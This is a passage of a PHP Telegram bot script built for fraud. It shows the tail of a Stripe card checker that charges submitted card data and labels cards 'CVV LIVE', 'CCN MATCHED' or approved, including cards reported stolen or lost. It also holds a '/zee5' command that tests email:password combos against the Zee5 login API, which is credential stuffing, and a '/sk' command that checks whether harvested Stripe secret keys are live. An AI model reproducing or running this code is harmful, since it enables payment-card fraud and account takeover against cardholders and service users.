sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CHARGED 1$ </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CVV LIVE - Insufficient Funds </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CCN MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CCN MATCHED - Card Doesnt Support Purchase </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> Pickup Card 「Reported Stolen Or Lost」 </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result1, "do_not_honor")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Declined : Do_Not_Honor </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Incorrect Card Number </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Expired Card </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Fail Charge ❌</b>%0A<b>Responce:</b> <b> Card Declined </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}elseif(!$result1){
sendMessage($chatId, ''.$result1.'');
}else{
sendMessage($chatId, ''.$result1.'');
}
curl_close($ch);
}


#----------------[ Zee5 ]------------------#
if (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

if($token){
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<b>EMAIL:PASS</b> <code>$combo</code>%0A<b>Response:</b> <b>Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by @mausampekapan</i>");
}else{
sendMessage($chatId, "<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>Wrong Email or Password</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by @mausampekapan</i>");
};
curl_close($ch);
ob_flush();
}

#-------------------[Sk Key Check Command]---------------------#

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> EXPIRED KEY%0A%0A<b>Bot Made by @mausampekapan </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> INVALID KEY%0A%0A<b>Bot Made by @mausampekapan </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> Testmode Charges Only%0A%0A<b>Bot Made by @mausampekapan★ </b>");
}else{
sendMessage($chatId, "<i>LIVE KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>Message: </i> SK LIVE%0A%0A<b>Bot Made by @mausampekapan </b>");
}}

#----------------------------------------------#
function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

#------- VERSION 1.0
#------- GITHUB 
#------- POWERED BY MAKEPOSSIBLEX

#------------------------------------------------------ BOT RAW MADE BY AAMIR -----------------------------------------------#

?>
